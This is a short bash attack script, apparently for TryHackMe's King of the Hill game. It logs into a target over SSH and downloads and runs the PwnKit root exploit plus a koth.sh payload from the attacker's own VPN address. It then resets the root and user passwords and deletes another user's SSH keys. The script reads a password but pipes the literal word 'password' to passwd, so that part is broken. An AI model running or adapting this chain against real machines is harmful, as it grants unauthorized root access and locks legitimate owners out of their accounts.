#!/bin/bash


read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no narrator@"$ip_address" << EOF
    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick" 
    echo "password" | passwd --stdin root
    echo "password" | passwd --stdin narrator
    echo "password" | passwd --stdin tdurden
    rm -rf /home/tdurden/.ssh
EOF
